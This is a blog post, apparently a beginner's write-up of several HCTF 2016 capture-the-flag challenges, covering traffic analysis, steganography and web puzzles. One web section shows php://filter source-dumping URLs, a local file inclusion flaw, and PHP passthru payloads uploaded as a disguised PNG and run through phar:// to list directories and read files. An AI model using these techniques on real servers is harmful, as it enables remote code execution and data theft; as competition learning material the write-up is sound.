<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>2016HCTF-writeup | Headwind&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="写在开头的话2016HCTF应该是我第一场比较认真参加的一场CTF了，由于还是个萌新，啥都不懂，这篇文章就是把当时自己做出来的题的做题思路记录一下（其实早该发了，但是因为我懒【捂脸】），让各位dalao见笑了官方wp在这→HCTF 2016网络攻防大赛官方Writeup膜拜杭电各位大佬 第一层MISC 杂项签到http://139.224.54.27/webco1a/+_+.pcapng用wire">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="2016HCTF-writeup">
<meta property="og:url" content="http://h34dw1nd.github.io/2017/01/01/2016HCTF-writeup/index.html">
<meta property="og:site_name" content="Headwind&#39;s Blog">
<meta property="og:description" content="写在开头的话2016HCTF应该是我第一场比较认真参加的一场CTF了，由于还是个萌新，啥都不懂，这篇文章就是把当时自己做出来的题的做题思路记录一下（其实早该发了，但是因为我懒【捂脸】），让各位dalao见笑了官方wp在这→HCTF 2016网络攻防大赛官方Writeup膜拜杭电各位大佬 第一层MISC 杂项签到http://139.224.54.27/webco1a/+_+.pcapng用wire">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/ex1-1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/ex1-2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/web2009.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/gogogo-1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/gogogo-2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/教练我想打CTF-2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/教练我想打CTF-3.png">
<meta property="og:updated_time" content="2017-12-18T13:19:32.227Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2016HCTF-writeup">
<meta name="twitter:description" content="写在开头的话2016HCTF应该是我第一场比较认真参加的一场CTF了，由于还是个萌新，啥都不懂，这篇文章就是把当时自己做出来的题的做题思路记录一下（其实早该发了，但是因为我懒【捂脸】），让各位dalao见笑了官方wp在这→HCTF 2016网络攻防大赛官方Writeup膜拜杭电各位大佬 第一层MISC 杂项签到http://139.224.54.27/webco1a/+_+.pcapng用wire">
<meta name="twitter:image" content="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/ex1-1.png">
  
    <link rel="alternate" href="/atom.xml" title="Headwind&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Headwind&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://h34dw1nd.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-2016HCTF-writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/01/01/2016HCTF-writeup/" class="article-date">
  <time datetime="2016-12-31T16:27:32.000Z" itemprop="datePublished">2017-01-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2016HCTF-writeup
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在开头的话"><a href="#写在开头的话" class="headerlink" title="写在开头的话"></a>写在开头的话</h2><p>2016HCTF应该是我第一场比较认真参加的一场CTF了，由于还是个萌新，啥都不懂，这篇文章就是把当时自己做出来的题的做题思路记录一下（其实早该发了，但是因为我懒【捂脸】），让各位dalao见笑了<br>官方wp在这→<a href="http://www.freebuf.com/articles/web/121778.html" target="_blank" rel="noopener">HCTF 2016网络攻防大赛官方Writeup</a><br>膜拜杭电各位大佬</p>
<h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><h3 id="MISC-杂项签到"><a href="#MISC-杂项签到" class="headerlink" title="MISC 杂项签到"></a>MISC 杂项签到</h3><p><a href="http://139.224.54.27/webco1a/+_+.pcapng" target="_blank" rel="noopener">http://139.224.54.27/webco1a/+_+.pcapng</a><br>用wireshark打开流量包，追踪TCP流，发现是一个webshell的流量，看到webshell控制端查看了远程服务器上的两个关键文件：function.py和flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">cat function.py</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding:utf-8</span><br><span class="line">__author__ = &apos;Aklis&apos;</span><br><span class="line"></span><br><span class="line">from Crypto import Random</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt(encrypted, passphrase):</span><br><span class="line">  IV = encrypted[:16]</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  return aes.decrypt(encrypted[16:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(message, passphrase):</span><br><span class="line">  IV = message[:16]</span><br><span class="line">  length = 16</span><br><span class="line">  count = len(message)</span><br><span class="line">  padding = length - (count % length)</span><br><span class="line">  message = message + &apos;\0&apos; * padding</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  return aes.encrypt(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IV = &apos;YUFHJKVWEASDGQDH&apos;</span><br><span class="line"></span><br><span class="line">message = IV + &apos;flag is hctf&#123;xxxxxxxxxxxxxxx&#125;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print len(message)</span><br><span class="line"></span><br><span class="line">example = encrypt(message, &apos;Qq4wdrhhyEWe4qBF&apos;)</span><br><span class="line">print example</span><br><span class="line">example = decrypt(example, &apos;Qq4wdrhhyEWe4qBF&apos;) </span><br><span class="line">print example</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag:</span><br><span class="line">mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==</span><br></pre></td></tr></table></figure>
<p>flag明显是个base64编码后的字符串，将其解码后再用function.py和decrypt函数解密：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/ex1-1.png" alt=""></p>
<p>运行得到flag：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/ex1-2.png" alt=""></p>
<hr>
<h3 id="Web-2099年的flag"><a href="#Web-2099年的flag" class="headerlink" title="Web 2099年的flag"></a>Web 2099年的flag</h3><p>由ios99想到改user-agent，抓包改一下：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/web2009.png" alt=""></p>
<hr>
<h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><h3 id="Web-RESTFUL"><a href="#Web-RESTFUL" class="headerlink" title="Web RESTFUL"></a>Web RESTFUL</h3><p><a href="http://jinjia.hctf.io/index.php" target="_blank" rel="noopener">http://jinjia.hctf.io/index.php</a><br>打开看到页面下方有提示：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-1.png" alt=""><br>用PUT方法传个参<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-2.png" alt=""><br>因为刚接触web，不懂RESTful是什么，查了一下RESTful，发现是一种web软件架构<br><a href="http://www.ruanyifeng.com/blog/2011/09/restful" target="_blank" rel="noopener">理解RESTful架构</a><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-3.png" alt=""><br>改个包，flag出来了<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-4.png" alt=""></p>
<h3 id="MISC-gogogo"><a href="#MISC-gogogo" class="headerlink" title="MISC gogogo"></a>MISC gogogo</h3><p>下载下来，发现是个.nes的红白机文件，用FcEuX打开，看到了经典的魂斗罗<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/gogogo-1.png" alt="9"><br>按照 <a href="http://wenku.baidu.com/link?url=1i4slMmKov6LncwLAwa-VmJmAwRwIkgcK-xzls2uOnuJzS7wrsG_mjDdVOVbQzG0Q5p6NmRzcd-vBIbpuWihXEdoiQWs6dsc03aggjzd3Ty" target="_blank" rel="noopener">http://wenku.baidu.com/link?url=1i4slMmKov6LncwLAwa-VmJmAwRwIkgcK-xzls2uOnuJzS7wrsG_mjDdVOVbQzG0Q5p6NmRzcd-vBIbpuWihXEdoiQWs6dsc03aggjzd3Ty</a> 所说的来修改成无限命和不坏金身，打通关就看到了：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/gogogo-2.png" alt=""></p>
<h3 id="Web-兵者多诡"><a href="#Web-兵者多诡" class="headerlink" title="Web 兵者多诡"></a>Web 兵者多诡</h3><p><a href="http://pics.hctf.io/home.php?key=hduisa123" target="_blank" rel="noopener">http://pics.hctf.io/home.php?key=hduisa123</a><br>参考文章<a href="http://www.hackdig.com/09/hack-26779.htm" target="_blank" rel="noopener">http://www.hackdig.com/09/hack-26779.htm</a><br>看到文件上传页面 猜测是上传漏洞，页面说明只能上传png文件<br>尝试了几次后发现验证方式是对content-type验证，为image/png即可，但是上传后的文件会被重新命名并加上.png后缀。<br>发现允许使用php伪协议：<br><a href="http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=upload" target="_blank" rel="noopener">http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=upload</a><br><a href="http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=home" target="_blank" rel="noopener">http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=home</a><br><a href="http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=function" target="_blank" rel="noopener">http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=function</a><br><a href="http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=show" target="_blank" rel="noopener">http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=show</a><br>把源码扒下来，base64解码，<br>home.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(1000);</span><br><span class="line"></span><br><span class="line">$fp = empty($_GET[&apos;fp&apos;]) ? &apos;fail&apos; : $_GET[&apos;fp&apos;];</span><br><span class="line">if(preg_match(&apos;/\.\./&apos;,$fp))</span><br><span class="line">&#123;</span><br><span class="line">	die(&apos;No No No!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&apos;/rm/i&apos;,$_SERVER[&quot;QUERY_STRING&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">	die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;&lt;/title&gt;</span><br><span class="line">		&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;link href=&quot;css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">		&lt;link href=&quot;css/jumbotron-narrow.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">			&lt;div class=&quot;header clearfix&quot;&gt;</span><br><span class="line">				&lt;nav&gt;</span><br><span class="line">					&lt;ul class=&quot;nav nav-pills pull-right&quot;&gt;</span><br><span class="line">						&lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt;&lt;a href=&quot;home.php?key=hduisa123&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">					&lt;/ul&gt;</span><br><span class="line">				&lt;/nav&gt;</span><br><span class="line">				&lt;h3 class=&quot;text-muted&quot;&gt;pictures&lt;/h3&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">			&lt;div class=&quot;jumbotron&quot;&gt;</span><br><span class="line">				&lt;h1&gt;Pictures Storage&lt;/h1&gt;</span><br><span class="line">				&lt;p class=&quot;lead&quot;&gt;在这里上传您的图片,我们将为您保存&lt;/p&gt;</span><br><span class="line">				&lt;form action=&quot;?fp=upload&quot; method=&quot;POST&quot; id=&quot;form&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">					&lt;input type=&quot;file&quot; id=&quot;image&quot; name=&quot;image&quot; class=&quot;btn btn-lg btn-success&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;</span><br><span class="line">					&lt;br&gt;</span><br><span class="line">					&lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-lg btn-success&quot; role=&quot;button&quot; value=&quot;上传图片&quot;&gt;</span><br><span class="line">				&lt;/form&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">	   	&lt;/div&gt; </span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php  </span><br><span class="line">if($fp !== &apos;fail&apos;)</span><br><span class="line">&#123;</span><br><span class="line">	if(!(include($fp.&apos;.php&apos;)))</span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;没有此页面&lt;/div&gt;</span><br><span class="line">		&lt;?php</span><br><span class="line">			exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>upload.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &apos;function.php&apos;;</span><br><span class="line">if(isset($_POST[&apos;submit&apos;]) &amp;&amp; !empty($_FILES[&apos;image&apos;][&apos;tmp_name&apos;]))</span><br><span class="line">&#123;	</span><br><span class="line">	$name = $_FILES[&apos;image&apos;][&apos;tmp_name&apos;];</span><br><span class="line">	$type = $_FILES[&apos;image&apos;][&apos;type&apos;];</span><br><span class="line">	$size = $_FILES[&apos;image&apos;][&apos;size&apos;];</span><br><span class="line"></span><br><span class="line">	if(!is_uploaded_file($name))</span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;图片上传失败,请重新上传&lt;/div&gt;</span><br><span class="line">		&lt;?php</span><br><span class="line">			exit;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	if($type !== &apos;image/png&apos;)</span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;只能上传PNG图片&lt;/div&gt;</span><br><span class="line">		&lt;?php</span><br><span class="line">			exit;</span><br><span class="line">	&#125; 	</span><br><span class="line"></span><br><span class="line">	if($size &gt; 10240)</span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;图片大小超过10KB&lt;/div&gt;</span><br><span class="line">		&lt;?php</span><br><span class="line">			exit;	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$imagekey = create_imagekey();</span><br><span class="line">	move_uploaded_file($name,&quot;uploads/$imagekey.png&quot;);</span><br><span class="line"></span><br><span class="line">	echo &quot;&lt;script&gt;location.href=&apos;?fp=show&amp;imagekey=$imagekey&apos;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>show.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$imagekey = $_GET[&apos;imagekey&apos;];</span><br><span class="line">if(empty($imagekey))</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;&lt;script&gt;location.href=&apos;home.php&apos;&lt;/script&gt;&quot;;</span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&gt;</span><br><span class="line">	上传成功,&lt;a href=&quot;uploads/&lt;?php echo $imagekey; ?&gt;.png&quot; class=&quot;alert-link&quot;&gt;点此查看&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>
<p>function.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">	function create_imagekey()</span><br><span class="line">	&#123;</span><br><span class="line">		return sha1($_SERVER[&apos;REMOTE_ADDR&apos;] . $_SERVER[&apos;HTTP_USER_AGENT&apos;] . time() . mt_rand());</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>发现home.php中存在本地文件包含:<code>if(!(include($fp.’.php’)))</code>，fp参数可控制，然后会在文件名后加一个.php进行文件包含，因此我们可以上传我们需要包含的文件。但是直接包含肯定是不行的，需要构造文件名。<br>查询PHP手册发现PHP支持如下的Wrappers：</p>
<pre><code>file:// — Accessing local filesystem
http:// — Accessing HTTP(s) URLs
ftp:// — Accessing FTP(s) URLs
php:// — Accessing various I/O streams
zlib:// — Compression Streams
data:// — Data (RFC 2397)
glob:// — Find pathnames matching pattern
phar:// — PHP Archive
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — Audio streams
expect:// — Process Interaction Streams
</code></pre><p>测试phar://可用，将php文件打包在zip文件中，再构造路径访问。<br>测试发现eval函数被禁用了，因此使用passthru函数执行系统命令。<br>写一个2.php文件，（这里我做题的时候似乎测试到有GET、POST、REQUEST等字段会被过滤，最后看官方wp是可以用GET的，可能是当时我测的出了点问题）打包在zip压缩包中上传，上传时使用burpsuite的截断功能修改content-type。<br>查看当前目录下文件：&lt;?php passthru(‘ls –alh’); ?&gt;<br>上传后访问文件名为24c38706822f22274de3d8faabb5b9601d922d85.png ，访问<br><a href="http://pics.hctf.io/home.php?fp=phar://uploads/24c38706822f22274de3d8faabb5b9601d922d85.png/2" target="_blank" rel="noopener">http://pics.hctf.io/home.php?fp=phar://uploads/24c38706822f22274de3d8faabb5b9601d922d85.png/2</a><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-1.png" alt=""><br>没什么特别的<br>查看工作目录<br><code>&lt;?php passthru(‘pwd’); ?&gt;</code><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-2.png" alt=""><br>查看上层目录<br><code>&lt;?php echo passthru(‘ls /var/www’);?&gt;</code><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-3.png" alt=""><br>有个php文件，查看一下<br><code>&lt;?php echo passthru(‘cat /var/www/Th1s_1s_F1a9.php’);?&gt;</code><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-4.png" alt=""><br>查看页面源代码<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-5.png" alt=""></p>
<h3 id="MISC-教练我想打CTF"><a href="#MISC-教练我想打CTF" class="headerlink" title="MISC 教练我想打CTF"></a>MISC 教练我想打CTF</h3><p>用神器Stegsolve打开，感觉在RGB0位有点问题，猜测是LSB隐写，分析一下<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/教练我想打CTF-2.png" alt=""><br>发现有pk文件头，猜测是个zip压缩包，保存出来，解压，发现提示文件损坏，用winrar自带的工具修复一下，成功了，打开看到一个叫1的文件，010editor打开，发现是个elf文件，继续往下看，成功发现flag<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/教练我想打CTF-3.png" alt=""></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这次比赛，学到了很多新姿势，也让我认识到自己到底有多菜，dalao们有多强，再次膜拜各位dalao</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://h34dw1nd.github.io/2017/01/01/2016HCTF-writeup/" data-id="cjbca8j2z00044ovkk0z75z89" class="article-share-link">Teilen</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2017/03/05/ZCTF2017-web100-write-up/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Neuer</strong>
      <div class="article-nav-title">
        
          ZCTF2017-web100 write up
        
      </div>
    </a>
  
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/瞎写/">瞎写</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/漏洞分析/" style="font-size: 10px;">漏洞分析</a> <a href="/tags/瞎写/" style="font-size: 10px;">瞎写</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archiv</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">letzter Beitrag</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/12/18/Windosw环境下安装Z3约束求解器并使用Python-Binding/">Windosw环境下安装Z3约束求解器并使用Python Binding</a>
